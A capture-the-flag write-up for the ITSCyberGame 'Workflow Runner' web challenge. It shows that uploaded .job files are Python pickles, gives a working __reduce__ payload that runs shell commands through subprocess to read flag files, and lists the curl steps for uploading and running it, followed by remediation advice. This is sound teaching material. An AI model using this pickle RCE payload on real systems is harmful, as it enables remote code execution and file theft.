# Workflow Runner

**Competition:** ITSCyberGame <br>
**Category:** Web <br>
**Service:** `sfide.itscybergame.it:<port_number>`

---

## Description

> "Here jobs can run without problems, as long as they conform to the format I want. Any objections? Let's see what you can do."

An internal panel allows uploading and executing company "workflow" files with extension `.job`. A sample file can be downloaded and users can upload their own. The description explicitly mentions a "Python serializer".

---

## Solution

### 1. Recon

Check the homepage:

```bash
curl -s http://sfide.itscybergame.it:<port_number>/
```

Endpoints discovered:
- `GET /sample` — download example workflow
- `POST /upload` — upload a `.job` file
- `GET /run/{id}` — execute a stored job

Download the sample:

```bash
curl -s http://sfide.itscybergame.it:<port_number>/sample -o sample.job
file sample.job
# sample.job: data
```

### 2. `.job` format analysis — insecure deserialization

The sample is a binary file. Inspect magic bytes:

```python
data = open('sample.job','rb').read()
print(repr(data[:10]))
# b'\x80\x04\x95\x8f\x00\x00\x00\x00\x00\x00\x00'
```

Prefix `\x80\x04` indicates Python pickle protocol 4 — the file is produced with `pickle.dumps()`.

```python
import pickle
obj = pickle.loads(data)
print(obj)
# {'workflow': 'demo-report', 'version': 1, 'steps': [...], 'owner': 'team-automazioni', 'status': 'ok'}
```

The server calls `pickle.loads()` on uploaded files without validation. `pickle` executes object reduction hooks (e.g. `__reduce__`) during deserialization, enabling arbitrary code execution.

### 3. Upload/run flow

- `POST /upload` saves the file and redirects to `/`.
- The homepage lists uploaded jobs with an "Execute" link: `GET /run/{id}`.
- `/run/{id}` performs `pickle.loads()` and displays the returned value on the page.

Example link shown on the page:

```html
<a class="button" href="/run/02d4b8d57f744c048ac154aac301d548">Execute</a>
```

### 4. Exploit — Pickle RCE

Build a payload exploiting `__reduce__` to run a shell command and return its stdout as the job result:

```python
import pickle, subprocess

class Exploit(object):
    def __reduce__(self):
        cmd = "cat /flag* /home/*/flag* /root/flag* /app/flag* 2>/dev/null"
        return (subprocess.check_output, (['/bin/sh','-c', cmd],))

payload = pickle.dumps(Exploit())
open('exploit.job','wb').write(payload)
```

Upload the exploit:

```bash
curl -s -X POST http://sfide.itscybergame.it:<port_number>/upload \
  -F "job_file=@exploit.job;filename=exploit.job"
# → redirect to /
```

Find the job ID and execute it:

```bash
curl -s http://sfide.itscybergame.it:<port_number>/ | grep "Execute"
curl -s http://sfide.itscybergame.it:<port_number>/run/<id>
```

Server response example:

```html
<pre class="result-box">b'flag{...}\n'</pre>
```

---

## Flag

```
flag{...}
```

---

## Conclusions

| Step | Detail |
|------|--------|
| **Discovery** | `/sample` reveals the `.job` format is a Python pickle |
| **Vuln** | `pickle.loads()` on user-provided data → RCE via `__reduce__` |
| **Trick** | The job is not executed at upload; it is deserialized on `GET /run/{id}` |
| **Exfil** | `subprocess.check_output` returns stdout as the job return value, shown on the page |

- `pickle` is not a safe serialization format for untrusted data: there is no reliable way to "sanitize" a malicious pickle without executing it. Use `json`, `msgpack`, or `jsonschema`-validated YAML for user input.
- Validating only the file extension (`.job`) offers no protection: the binary content is what matters.
- The upload → deferred execution pattern does not mitigate the risk: deserialization is the vulnerable point regardless of when it happens.
